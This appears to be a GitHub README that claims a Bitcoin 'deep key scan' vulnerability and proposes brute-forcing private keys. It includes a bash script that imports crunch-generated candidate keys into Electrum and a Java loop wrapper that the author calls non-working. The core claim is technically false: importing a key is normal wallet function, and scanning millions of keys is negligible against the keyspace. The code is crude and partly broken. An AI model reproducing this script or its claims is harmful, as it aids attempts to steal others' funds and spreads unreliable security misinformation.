# bitcoin-lost-deep-key-private-key
#lost bitcoin , deep key private key

The core concepts of how the blockchain works and operates remains uneffected by this vulernability in how bitcoin works,

#Github,

#	It might be possible to scan bitcoin private keys sitting on the network due to a vulnerability in the way bitcoin was #designed since there is nothing really safeguarding the internal framework of the bitcoin wallet either in classic, core or #other variants. Even by encrypting your wallet nothing prevents the importation of a private key by changing a configuration #flag in any wallet whether it is classic, core or a variant. I have attempted to test a basic attack vector using a password #generation program based on JTR and crunch (https://sourceforge.net/projects/crunch-wordlist/) to generate a range of base 58 #values based on bitcoin private keys and under further modification it is possible to continue to customize this form of #private key deep scan and execute it as a basic attack vector. The banking system should be notified not to get on-board with #the Bitcoin network, even though originally the bitcoin network might have represented a form of Independence from banking #institutions to by pass terrible fees from the banks and other dilemmas caused by most banks having full control.
#	As an example of private key generation and experimentation within the bitcoin network some private keys start with #L5..c4 or Ky..k1 < as an example 52 characters alpha-numeric no special characters, decoded they flip around to an address #starting with 1 as part of the end decoded process, similar to how paper wallets are printed exported and imported there is #nothing protecting a paper wallet if it is a known similar to how a private key bears no security or protection from import to #a wallet whether it is classic, core or a variant.
#	I estimate on a modern system this deep key scan for a small set of keys ranging in a few million private keys could #take anywhere from 3 to 4 months to generate and scan, furthermore I have written a crude script to try newly generated private #keys using “crunch” password generator to generate 52 character private keys starting with L or K.

this problem could also effect any "ALT" that uses the same model for private key to address encoding-decoding

# https://bitcoinelectrum.com/importing-your-private-keys-into-electrum/

#as an example using bash from a crude semi working type

#where the .txt files are private key deep search blocks generated by crunch password generator
#and electrum has to have a config flag flipped in order to import private keys, in order to being import
#you have to import a pre-existing working private key into electrum which is used here.

#!/bin/sh 

head -n1 L1nQuHYTwKuzPmKJCfLhEgpCGsYjjmvCecnc7XNQWvBZLV9FrQ5X-L1nQuHYTwKuzPmKJCfLhEgpCGsYjjmvCecnc7XNQWvBZLV9GI50f.txt > newfile.txt 
cat newfile.txt 
perl -p -i -e 's/\R//g;' newfile.txt 
cat newfile.txt 
cat newfile.txt | electrum importprivkey - 
tail -n +2 "L1nQuHYTwKuzPmKJCfLhEgpCGsYjjmvCecnc7XNQWvBZLV9FrQ5X-L1nQuHYTwKuzPmKJCfLhEgpCGsYjjmvCecnc7XNQWvBZLV9GI50f.txt" > "L1nQuHYTwKuzPmKJCfLhEgpCGsYjjmvCecnc7XNQWvBZLV9FrQ5X-L1nQuHYTwKuzPmKJCfLhEgpCGsYjjmvCecnc7XNQWvBZLV9GI50f.txt.tmp" && mv "L1nQuHYTwKuzPmKJCfLhEgpCGsYjjmvCecnc7XNQWvBZLV9FrQ5X-L1nQuHYTwKuzPmKJCfLhEgpCGsYjjmvCecnc7XNQWvBZLV9GI50f.txt.tmp" "L1nQuHYTwKuzPmKJCfLhEgpCGsYjjmvCecnc7XNQWvBZLV9FrQ5X-L1nQuHYTwKuzPmKJCfLhEgpCGsYjjmvCecnc7XNQWvBZLV9GI50f.txt" 






#as a crude example using java in a non working model


/* 
 * To change this license header, choose License Headers in Project Properties. 
 * To change this template file, choose Tools | Templates 
 * and open the template in the editor. 
 */ 

//package deepkeysearch; 

import java.io.BufferedReader; 
import java.io.InputStreamReader; 

public class DeepKeySearch { 

    public static void main(String[] args) { 

        DeepKeySearch obj = new DeepKeySearch(); 



    System.out.println("Place in working directory of wordlists to process"); 

    System.out.println("Change text file rotation after L1nQuHYTwKuzPmKJCfLhEgpCGsYjjmvCecnc7XNQWvBZLV9FrQ5X-L1nQuHYTwKuzPmKJCfLhEgpCGsYjjmvCecnc7XNQWvBZLV9GI50f.txt"); 



        String command = "./deepkey.sh"; 


        String output = obj.executeCommand(command); 


        System.out.println(output); 

    } 

    private String executeCommand(String command) { 

        StringBuffer output = new StringBuffer(); 

        int infinite = 99; 

        while (infinite != 100) { 


        Process p; 
        try { 
            p = Runtime.getRuntime().exec(command); 
            p.waitFor(); 
            BufferedReader reader = 
                            new BufferedReader(new InputStreamReader(p.getInputStream())); 

                        String line = ""; 
            while ((line = reader.readLine())!= null) { 
                output.append(line + "\n"); 

        System.out.println(output); 

            } 

        } catch (Exception e) { 
            e.printStackTrace(); 
        } 

        infinite = 1; 

        } 

        return output.toString(); 

        } 



    } 






